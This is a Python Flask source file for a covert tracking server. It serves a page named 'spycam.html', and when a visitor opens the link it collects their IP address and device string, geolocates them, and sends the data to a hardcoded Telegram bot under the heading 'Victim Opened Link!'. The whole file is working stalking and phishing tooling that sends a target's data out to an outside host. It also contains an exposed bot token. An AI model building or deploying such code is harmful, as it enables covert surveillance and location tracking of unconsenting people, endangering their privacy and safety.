
from flask import Flask, request, send_file
import requests
import json
import platform
import socket

app = Flask(__name__)

BOT_TOKEN = "7640387930:AAF60XztsO7ChkAaoV6GJNJnBBfye-hjt6U"
CHAT_ID = "6908281054"

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return res
    except:
        return {}

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML"
    }
    requests.post(url, data=data)

@app.route("/")
def index():
    return send_file("spycam.html")

@app.route("/track", methods=["POST"])
def track():
    ip = request.remote_addr
    ua = request.headers.get("User-Agent")
    loc = get_location(ip)
    location_link = f"https://maps.google.com/?q={loc.get('lat')},{loc.get('lon')}"
    
    msg = f"📍 <b>Victim Opened Link!</b>\n🌐 <b>IP:</b> {ip}\n📱 <b>Device:</b> {ua}\n🏙️ <b>City:</b> {loc.get('city')}\n🌍 <b>Country:</b> {loc.get('country')}\n📌 <b>Map:</b> {location_link}"
    send_telegram(msg)
    return "Tracked"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
